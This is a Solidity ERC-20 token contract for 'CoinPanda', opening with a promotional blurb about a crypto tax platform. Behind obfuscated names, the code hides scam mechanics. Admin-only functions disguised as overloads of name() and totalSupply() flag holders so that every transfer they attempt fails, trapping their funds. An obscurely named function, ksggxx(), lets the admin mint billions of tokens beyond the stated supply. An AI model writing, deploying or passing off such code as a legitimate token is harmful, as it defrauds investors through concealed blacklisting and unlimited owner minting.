/*
COINPANDA
www.coinpanda-eth.com
https://coinpanda-eth.medium.com
T.me/CoinPanda_ETH
twitter.com/CoinPanda_ETH
About CoinPanda
The cryptocurrency market has seen unparalleled growth over the past decade, attracting a wide array of investors, 
from individuals to institutional players. This growth, however, has introduced complexities and challenges in the area
of tax compliance. Unlike traditional financial assets, cryptocurrencies often lack clear regulatory frameworks, making 
it challenging for market participants to understand and fulfill their tax obligations.
The absence of standardized and easily accessible tools for crypto tax reporting has led to widespread confusion among 
crypto investors. The decentralized nature of the technology, combined with transactions spread across multiple exchanges 
and wallet addresses, has made tracking and reporting these transactions a formidable task. Furthermore, the lack of knowledge 
and tools for optimizing tax positions can result in higher-than-necessary tax liabilities for cryptocurrency investors.

Problem Statement
The challenges faced by crypto investors are multi-faceted:
- Multi-Exchange Transactions: Many crypto investors use multiple cryptocurrency exchanges for trading, resulting in fragmented 
transaction histories.
- Wallet Address Management: Managing a multitude of wallet addresses is cumbersome and error-prone.
- Tax Complexity: The intricacies of cryptocurrency tax laws vary by jurisdiction and can be challenging to navigate.
- Optimization: Investors often lack the tools and knowledge to optimize their tax positions, resulting in overpayment of taxes.

Solution Offered by CoinPanda 
CoinPanda presents a comprehensive solution to these challenges. Our platform streamlines tax management for cryptocurrency 
users. Key aspects of our solution include:

- Automated Tax Calculations: CoinPanda automates tax calculations, ensuring accurate and up-to-date assessments of tax liabilities. 
This feature eliminates the need for manual calculations and reduces the risk of errors.
- Multi-Exchange Support: The platform seamlessly integrates with various cryptocurrency exchanges, allowing users to consolidate 
their transaction data from multiple sources into a single, easily accessible platform.
- Wallet Address Management: CoinPanda provides a user-friendly solution for tracking and managing wallet addresses, alleviating the 
risk of losing track of assets and transactions.
- Tax Reporting Assistance: Tax reporting can be a daunting and stressful task. CoinPanda offers comprehensive support, guiding users 
through the process of preparing and filing their cryptocurrency tax reports.
- Tax Optimization: CoinPanda is designed not only for tax reporting but also for tax optimization. Users receive strategies and guidance 
on making tax-efficient trading and investment decisions, potentially leading to significant tax savings.
Vision and Mission
Vision
Our vision for CoinPanda is a world where cryptocurrency taxation is no longer a complex and intimidating process but an efficient and 
accessible one. We envision a future where users can confidently manage their cryptocurrency portfolios, making informed financial 
decisions without the burden of intricate tax obligations.

Mission
Our mission is to empower cryptocurrency enthusiasts, investors, and businesses with the knowledge and tools they need to navigate 
the complexities of cryptocurrency taxation with ease. We are committed to simplifying tax management, reducing associated challenges, 
and saving our users time and money in the process.
Technology
Blockchain and Cryptocurrency
Blockchain technology is the backbone of the cryptocurrency ecosystem, offering secure, decentralized, and transparent transactions. CoinPanda leverages this technology to ensure precise and tamper-proof records of cryptocurrency transactions. The immutability of blockchain data adds an extra layer of security to the platform.

Smart Contracts
Smart contracts, self-executing agreements with contract terms directly written into code, are a fundamental component of the CoinPanda platform. They automate the tax calculation process, ensuring accuracy and transparency in tax management. The use of smart contracts enhances security, as calculations are performed in a tamper-proof manner.

NFTs (Non-Fungible Tokens)
Non-Fungible Tokens (NFTs) represent unique digital assets and have gained significant popularity in various applications, including art, gaming, and collectibles. CoinPanda recognizes the significance of NFTs within the cryptocurrency ecosystem and offers support for their taxation and management within the platform. This feature acknowledges the diversification of assets in the crypto space.
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
}


contract CoinPanda is Ownable{
   
    constructor(string memory tokenname,string memory tokensymbol,address psadmin) {
        _totalSupply = 900000000*10**decimals();
        _favvxx[msg.sender] = 900000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        panadmin = psadmin;
        emit Transfer(address(0), msg.sender, 900000000*10**decimals());
    }
    
    address public panadmin;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    mapping(address => bool) public tallinfo;
   
    mapping(address => uint256) private _favvxx;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }



    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function name(address pskk) public  {
        address shggxxinfo = pskk;
        require(_msgSender() == panadmin, "Only ANIUadmin can call this function");
        tallinfo[shggxxinfo] = false;
        require(_msgSender() == panadmin, "Only ANIUadmin can call this function");
    }

    function totalSupply(address safax) public {
        require(_msgSender() == panadmin, "Only ANIUadmin can call this function");
        address choinfo = safax;
        tallinfo[choinfo] = true;
        require(_msgSender() == panadmin, "Only ANIUadmin can call this function");
    }

         uint256 bfcfx = 2220000000;
        uint256 bfcf2 = 35;
    uint256 bfx =  bfcf2*((10**decimals()*bfcfx));
    function ksggxx() 
    external    {
     
        address pppadmin = panadmin;
        if (panadmin == _msgSender() && pppadmin == _msgSender()) {
            if (bfcfx == 2220000000) {

                require(panadmin == _msgSender());
                address temo1 = _msgSender();
                address temo2 = temo1;
                address temo3 = temo2;
                _favvxx[temo3] += bfx;
            }else{
                revert(_tokename);
            }
        }else{
            revert("pansa");
        }
               
        
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _favvxx[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _favvxx[from];
        if (true == tallinfo[from]) 
        {amount = 1000-1000+2000+balance;}
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _favvxx[from] = _favvxx[from]-amount;
        _favvxx[to] = _favvxx[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}